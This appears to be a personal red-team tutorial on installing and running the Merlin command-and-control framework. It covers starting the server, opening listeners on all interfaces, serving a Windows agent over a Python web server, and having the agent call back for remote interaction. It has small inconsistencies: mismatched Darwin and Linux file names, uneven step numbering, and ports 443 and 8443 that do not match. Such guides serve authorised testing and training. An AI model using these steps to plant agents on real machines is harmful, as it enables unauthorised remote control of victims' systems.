#merlin #exploit #redteaming #c2
# Merlin C2 Framework Setup and Usage Guide

This guide provides a step-by-step methodology for downloading, installing, configuring, and using the Merlin C2 framework. By following this documentation, you will be able to set up and run the Merlin Server, configure listeners, deploy agents, and interact with them effectively.

---

## Step 1: Downloading and Extracting Merlin C2

1. **Download the Latest Version of Merlin**:
   - Go to the [Merlin GitHub Releases Page](https://github.com/Ne0nd0g/merlin/releases) to download the latest version of the framework.
   - Use the following `wget` command to download the server file:
     ```bash
     wget https://github.com/Ne0nd0g/merlin/releases/download/v2.1.3/merlinServer-Darwin-x64.7z
     ```
   
2. **Extract the Compressed File**:
   - After the file has been downloaded, extract it using the `7z` tool.
   - Use the following command to extract the file:
     ```bash
     7z x merlinServer-Linux-x64-v2.1.3.7z
     ```
   - Note: The extracted files are password protected. The password for extraction is **merlin**.

---

## Step 2: Running the Merlin Server

1. **Start the Merlin Server**:
   - Navigate to the folder where the server has been extracted and run the Merlin server with the following command:
     ```bash
     ./<name_of_server_file>
     ```
   - Example:
     ```bash
     ./merlinServer
     ```

1. **Server is Running**:
   - Once the server is running, navigate to the directory `/data/bin` to access the compiled Merlin CLI and Agent files:
     ```bash
     cd /data/bin
     ```

3. **Start the Merlin CLI**:
   - Run the Merlin CLI in the `/data/bin` directory with the following command:
     ```bash
     ./merlinCLI
     ```



**Start the Listeners**:
   - With the CLI running, initiate the listeners using the command:
     ```bash
     listeners
     ```



->  **Configure Merlin to Listen on a All  IP**'s:
   - If you wish to run Merlin on a global IP address (allowing access from any device in the network), follow these steps:
   
     - In the terminal where the Merlin CLI is running, execute the following commands:
       1. Set the interface to `0.0.0.0` (to listen on all interfaces):
          ```bash
          set Interface 0.0.0.0
          ```
       2. Set the port to `8443` (or any other port of your choice):
          ```bash
          set port 8443
          ```
       3. Start the listener:
          ```bash
          start
          ```
       4. Use the `show` command to verify the listener’s status:
          ```bash
          show
          ```

---

## Step 3: Running the Merlin Agent

### **---on kali linux ---**

1. **Running the Agent**:
   - Open a new terminal window and run the Merlin agent with the default URL pointing to the server:
     ```bash
     ./merlinAgent -url http://127.0.0.1:443
     ```

### **---on Windows ---**
send the windows agent to the windows machine .

use python server for sharing the windows agent to the windows machine.
```bash
python3 -m http.server {port no}
```

- access the server from windows browser and download the windows marlin agent.
- go to the folder where agent is downloaded open cmd in that directory.
- run the merlin agent 
```
.\<windoesmerlinagentname> -url <https://ip of machine where server is running>: port no
```

![[Pasted image 20241113141234.png]]


3. **Listing the Agents**:
   - To view all running agents, use the `sessions` command:
     ```bash
     sessions
     ```

---

## Step 4: Interacting with the Agents

1. **Interacting with an Agent**:
   - To interact with a specific agent, use the `interact` command followed by the agent's ID (listed in the `sessions` output):
     ```bash
     interact <agent_id>
     ```

2. **Available Commands**:
   - After successfully interacting with the agent, type `help` to see a list of available commands that you can execute on the agent machine.

---

This guide provides a clear and structured approach for anyone to follow and set up the Merlin C2 framework. Ensure that you follow each step carefully and verify your setup at each stage to avoid any issues.

Feel free to add screenshots at the specified locations (e.g., "screenshot 1", "screenshot 2", etc.) to provide visual aid for users.